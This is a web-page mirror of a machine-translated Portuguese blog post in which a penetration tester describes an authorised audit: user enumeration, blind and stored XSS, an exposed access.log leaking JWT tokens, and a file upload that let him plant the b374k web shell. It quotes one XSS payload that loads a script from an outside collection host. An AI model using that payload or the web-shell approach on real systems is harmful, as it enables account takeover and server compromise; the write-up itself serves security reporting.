<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üéÖüèº üí™üèæ üöú De um usu√°rio comum a um administrador de servidor completo (XSS, LFI, Web-Shell) ü¶Å üë©üèæ‚Äçüíº ‚úåüèæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="No in√≠cio do ano, um funcion√°rio de uma empresa escreveu para mim. Pelo que entendi, houve um pequeno conflito na empresa. Por causa disso, havia o ri...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>De um usu√°rio comum a um administrador de servidor completo (XSS, LFI, Web-Shell)</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/452854/"><img src="https://habrastorage.org/webt/pc/sr/se/pcsrseauno875cmhmbms8odj33e.jpeg"><br><br>  No in√≠cio do ano, um funcion√°rio de uma empresa escreveu para mim.  Pelo que entendi, houve um pequeno conflito na empresa.  Por causa disso, havia o risco de comprometimento do sistema por parte de alguns funcion√°rios.  A decis√£o de auditar o sistema foi definitivamente a correta.  Afinal, os resultados da inspe√ß√£o me surpreenderam agradavelmente e "desagradavelmente" surpreendeu o cliente. <br><a name="habracut"></a><br>  A arquitetura do sistema era, em princ√≠pio, padr√£o.  Foi baseado em um servi√ßo de autentica√ß√£o.  Al√©m disso, de acordo com o token emitido pelo jwt, o usu√°rio pode usar a funcionalidade do sistema em v√°rios subdom√≠nios. <br><br>  O teste foi limitado a um subdom√≠nio.  Mas o mais b√°sico de acordo com os clientes.  N√£o vou contar em detalhes todos os erros e problemas.  Eles foram descobertos muito.  Descreverei apenas aqueles que me pareciam mais curiosos. <br><br><h2>  Redund√¢ncia de informa√ß√µes ao procurar usu√°rios </h2><br>  A consulta de pesquisa para usu√°rios permitiu receber um conjunto de informa√ß√µes da seguinte natureza - ID do usu√°rio, Nome, Login, avatar ... <br><img src="https://habrastorage.org/webt/tg/qu/ov/tgquov-poitm1ptfpu0zbeluz80.png"><br>  Sem problemas, foi poss√≠vel coletar todo o usu√°rio do banco de dados Login_name.  Tamb√©m n√£o havia restri√ß√µes especiais na funcionalidade de login.  Em seguida, foi poss√≠vel selecionar uma senha em v√°rios fluxos ou executar phishing pontual nos usu√°rios mais importantes do sistema. <br><br><h2>  Cegar o XSS ao solicitar suporte ao usu√°rio. </h2><br>  Tive a impress√£o de que esse problema est√° presente em 90% dos sistemas que encontro.  Anteriormente, "idiotas" de plataformas para agregar an√°lises repetiram-me v√°rias vezes.  Os acessos aos sistemas de monitoramento do comportamento do usu√°rio na Internet tamb√©m chegaram.  Havia muitas coisas.  No entanto, poucas pessoas entendem o qu√£o perigoso isso pode ser.  Especificamente, essa vulnerabilidade foi escrita <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br>  Nesse caso, verifiquei se o ataque estava funcionando acidentalmente quando recebi uma notifica√ß√£o do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">XSS Hunter</a> .  O vetor de ataque foi o seguinte: <br><br><pre><code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"&gt;&lt;script src=https://sa.xss.ht&gt;&lt;/script&gt;</span></span></code> </pre> <br>  Mas o cliente n√£o acreditava que eu pudesse controlar o painel de administra√ß√£o por meio desse vetor de ataque.  Afinal, todas as informa√ß√µes valiosas s√£o armazenadas no armazenamento local.  Como o XSS Hunter n√£o suporta o recebimento de informa√ß√µes de armazenamento local, tive que implantar meu pr√≥prio registrador XSS.  A <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">publica√ß√£o a</a> seguir <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">foi</a> muito √∫til.  Como resultado do ataque repetido, foi poss√≠vel verificar se o token jwt do administrador pode ser facilmente obtido por meios maliciosos, mesmo a partir do armazenamento local. <br><img src="https://habrastorage.org/webt/ju/o_/gg/juo_ggzcuntv-w0xpqj8wyrc81s.png"><br><br>  Bem, ent√£o com os direitos de administrador no sistema, voc√™ pode fazer qualquer coisa. <br><br><h2>  XSS armazenado em um email. </h2><br>  Uma funcionalidade foi descoberta no sistema que permite criar convites por email emoldurados para registrar novos usu√°rios.  Voc√™ pode inserir o nome da pessoa no formul√°rio de carta.  Para tornar o email mais pessoal.  Como resultado, todo o conte√∫do n√£o foi escapado e caiu na carta.  Para realizar um ataque xss bem-sucedido semelhante por meio de uma carta, √© necess√°rio conhecer o cliente de email da v√≠tima e conhecer zero dia xss para esse cliente.  Em geral, o sucesso desse ataque, por defini√ß√£o, foi insignificante.  At√© o momento em que encontrei um bot√£o curioso no canto superior da carta. <br><br><img src="https://habrastorage.org/webt/_9/bc/aw/_9bcawpodb6qbagj8om9k7d0nhc.png"><br><br>  Foi uma oportunidade para abrir uma vers√£o web da carta.  E aqui uma surpresa me esperava.  Meu XSS funcionou.  Ao mesmo tempo, a vers√£o web da carta foi aberta no subdom√≠nio admin. *. Com <br><br><img src="https://habrastorage.org/webt/rk/nt/gt/rkntgtsisw3mf4oef6dfzc31tbq.png"><br><br>  Dupla surpresa, por assim dizer. <br><br><h2>  Arquivo dispon√≠vel access.log </h2><br>  No processo de auditoria, encontrei um lugar interessante.  Quando caracteres diferentes entraram na solicita√ß√£o, o 404 chegou em resposta do servidor, mas periodicamente a resposta 404 foi um pouco diferente da anterior.  √Äs vezes havia um cabe√ßalho extra.  √Äs vezes n√£o.  Uma certa muta√ß√£o nas respostas do sistema me levou a verificar a inclus√£o de arquivo local ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">LFI</a> ) neste local.  Configurei o dicion√°rio lfi e esperei que o sistema retornasse respostas para todos os meus pedidos.  Como resultado, ao visualizar os resultados do teste, fiquei muito surpreso com a resposta com um status de 200 e um tamanho muito ponderado dos dados transmitidos. <br><br><img src="https://habrastorage.org/webt/kl/vc/cw/klvccwx_esjpgpgzbian0kyxd4c.png"><br><br>  Descobri que encontrei um arquivo leg√≠vel access.log.  Este arquivo registrou toda a atividade no servidor.  Incluindo neste arquivo, foi poss√≠vel detectar tokens de usu√°rio jwt. <br><img src="https://habrastorage.org/webt/ld/wy/rs/ldwyrs3tnisd5_jm4sbmcx2dmom.png"><br><br>  O tempo de expira√ß√£o desses tokens foi bastante grande.  E isso tamb√©m n√£o foi muito bom. <br><br><h2>  Acesso total do shell da web ao servidor </h2><br>  Em princ√≠pio, todos os itens acima s√£o problemas comuns.  Mas alguns tipos de vulnerabilidades j√° s√£o dif√≠ceis de enfrentar.  √â sobre o acesso ao servidor atrav√©s de um c√≥digo bem carregado no arquivo shell.php.  Ap√≥s o qual todos os projetos localizados neste servidor s√£o comprometidos.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">Bo0oM</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">escreveu</a> sobre esta quest√£o em 2016 em seu blog. <br>  Mas voltando ao meu exemplo.  O sistema tinha a capacidade de fazer publica√ß√µes.  Ao mesmo tempo, foi poss√≠vel fazer upload de uma foto para publica√ß√£o.  A imagem foi salva no mesmo dom√≠nio.  Mas o nome do arquivo foi alterado √† for√ßa.  Ou seja, voc√™ faz o upload - mypicture.jpg.  Mas, como resultado, voc√™ recebe 12345.jpg.  Decidi verificar o que aconteceria se eu transferisse o arquivo xml (na √©poca eu aparentemente sonhava em conhecer o XXE).  E para minha surpresa, recebi a resposta 123556.xml.  E ent√£o eu percebi que h√° uma chance de 99% de sucesso com a extens√£o de arquivo php para o shell da web.  Para este ataque, usei o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">shell b374k</a> .  Com acesso direto ao arquivo - consegui o que queria.  Acesso aos diret√≥rios do servidor. <br><br><img src="https://habrastorage.org/webt/bt/ik/lf/btiklfakt0wb2gyiwahanzp6k1k.png"><br><br>  Mas isso n√£o foi a coisa mais triste.  O mais triste foi que, com essa vulnerabilidade, foi poss√≠vel comprometer mais de 10 projetos que estavam no diret√≥rio raiz deste servidor. <br><br><img src="https://habrastorage.org/webt/o6/tw/cw/o6twcw5jb6vfazbvbhn3lzqivdg.png"><br><br>  Meu amigo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">cyberpunkyc</a> disse que isso poderia ser visto no ano de 2007-2010.  Infelizmente, no quintal de 2019. Um problema semelhante existe at√© hoje. <br><br>  Como resultado dos testes, o cliente ficou muito surpreso com os resultados.  E fiquei muito feliz por ter sido muito √∫til nos testes.  Se voc√™ tiver alguma sugest√£o com projetos interessantes - sinta-se √† vontade para me escrever em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">telegrama</a> ;) </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt452854/">https://habr.com/ru/post/pt452854/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt452844/index.html">Transforma√ß√£o ou palavr√µes: como "digitalizar" operadores de telecomunica√ß√µes</a></li>
<li><a href="../pt452846/index.html">Como constru√≠mos um cluster confi√°vel do PostgreSQL no Patroni</a></li>
<li><a href="../pt452848/index.html">O que acontecer√° em 1¬∫ de fevereiro de 2020?</a></li>
<li><a href="../pt452850/index.html">Sistemas dentro de cartuchos: como os engenheiros expandiram os recursos dos consoles de jogos</a></li>
<li><a href="../pt452852/index.html">Trabalho remoto: mitos √† noite</a></li>
<li><a href="../pt452856/index.html">Por que projetos indie n√£o vivem para lan√ßar</a></li>
<li><a href="../pt452872/index.html">Como n√£o me preparei e realizei um semin√°rio de Rosnanov sobre FPGAs em Moscou. Planeja fazer o mesmo em Las Vegas e Zelenograd</a></li>
<li><a href="../pt452876/index.html">UICollectionViewLayout para pizza de diferentes partes</a></li>
<li><a href="../pt452880/index.html">Dados sensacionais dos usu√°rios vazam de janeiro a abril de 2019</a></li>
<li><a href="../pt452882/index.html">Erro do cliente no primeiro contato com o freelancer</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>